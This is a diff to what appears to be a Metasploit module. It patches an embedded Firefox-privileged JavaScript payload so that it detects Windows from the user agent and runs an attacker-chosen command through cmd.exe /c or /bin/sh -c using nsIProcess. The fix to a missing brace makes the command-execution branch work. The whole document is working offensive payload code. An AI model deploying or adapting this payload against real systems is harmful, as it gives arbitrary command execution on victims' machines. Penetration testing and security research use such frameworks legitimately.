@@ -39,9 +39,13 @@ module Metasploit3
         #{read_file_source if datastore['WSCRIPT']}
         #{run_cmd_source if datastore['WSCRIPT']}
 
+        var ua = Components.classes["@mozilla.org/network/protocol;1?name=http"]
+        .getService(Components.interfaces.nsIHttpProtocolHandler).userAgent;
+        var windows = (ua.indexOf("Windows")>-1);
+
         var cmd = (#{JSON.unparse({ :cmd => datastore['CMD'] })}).cmd;
         if (#{datastore['WSCRIPT']} && windows) {
-           runCmd(cmd);
+          runCmd(cmd);
         } else {
           var process = Components.classes["@mozilla.org/process/util;1"]
                           .createInstance(Components.interfaces.nsIProcess);
@@ -51,7 +55,7 @@ module Metasploit3
           if (windows) {
             sh.initWithPath("C:\\\\Windows\\\\System32\\\\cmd.exe");
             args = ["/c", cmd];
-          else {
+          } else {
             sh.initWithPath("/bin/sh");
             args = ["-c", cmd];
           }
